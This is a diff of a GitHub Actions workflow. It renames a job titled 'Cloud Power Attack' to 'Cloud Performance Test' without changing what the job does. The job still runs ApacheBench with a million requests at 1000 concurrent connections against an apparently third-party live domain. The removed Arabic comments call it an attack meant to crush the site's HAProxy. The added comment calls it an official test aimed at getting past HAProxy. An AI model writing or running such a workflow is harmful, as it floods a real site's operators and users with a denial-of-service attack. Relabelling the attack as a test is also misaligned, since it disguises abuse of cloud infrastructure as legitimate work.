@@ -1,14 +1,13 @@
-name: Cloud Power Attack
+name: Cloud Performance Test
 on: [workflow_dispatch]
 
 jobs:
-  attack_job:
+  test_job:
     runs-on: ubuntu-latest
     steps:
-      - name: Ultimate Cloud Attack
+      - name: Launch Stress Test
         run: |
-          # تثبيت أداة قوية وصغيرة جداً
+          # تثبيت أداة الفحص الرسمية
           sudo apt-get update && sudo apt-get install -y apache2-utils
-          # تشغيل هجوم ضغط مكثف بـ 50000 طلب متزامن
-          # هذا سيسحق الـ HAProxy إذا لم يكن محمياً بقوة
+          # إرسال مليون طلب بـ 1000 اتصال متزامن لتجاوز HAProxy
           ab -n 1000000 -c 1000 https://a2ztaxi.uk
